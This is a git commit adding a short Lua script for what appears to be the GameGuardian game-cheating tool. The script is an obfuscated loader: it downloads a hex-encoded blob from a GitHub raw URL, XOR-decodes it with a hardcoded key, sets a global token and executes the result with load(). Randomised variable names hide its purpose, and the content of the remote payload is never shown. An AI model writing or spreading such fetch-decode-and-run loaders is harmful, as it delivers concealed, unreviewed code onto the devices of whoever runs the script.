cc01183f0162d71ba7d086be3bda8f817cfba8ce
x2je20ndh1es1vr31jq <136950675+x2je20ndh1es1vr31jq@users.noreply.github.com>
2026-02-17 17:53:24 +0700

    Create mex-name.lua

---
+++ dl/mex-name.lua
@@ -0,0 +1,27 @@
+gg.clearResults()
+gg.toast("Wait..")
+local A9fQ2 = "https://raw.githubusercontent.com/darakubalika/darakubalika.github.io/main/me/sc-otr-nhu12"
+local Zx7P1 = gg.makeRequest(A9fQ2)
+if not Zx7P1 or not Zx7P1.content then
+gg.alert("Failed load")
+os.exit()
+end
+local M4Kq8 = {73,12,91,44,201}
+local P2dS9 = #M4Kq8
+local H7Lx3 = Zx7P1.content:gsub("%s+", "")
+local Vw8R0 = {}
+local C6Jt5 = 1
+for U9aE2 = 1, #H7Lx3, 2 do
+local YQ4N1 = tonumber(H7Lx3:sub(U9aE2, U9aE2 + 1), 16)
+Vw8R0[C6Jt5] = string.char(
+bit32.bxor(YQ4N1, M4Kq8[(C6Jt5 - 1) % P2dS9 + 1]))
+C6Jt5 = C6Jt5 + 1
+end
+local R5ZbK = table.concat(Vw8R0)
+_G.XPDT3 = "DEWANTI-XMFS7HQ-13"
+local W3P0D, L7EJ9 = load(R5ZbK)
+if not W3P0D then
+gg.alert("Error:\n" .. L7EJ9)
+os.exit()
+end
+W3P0D()
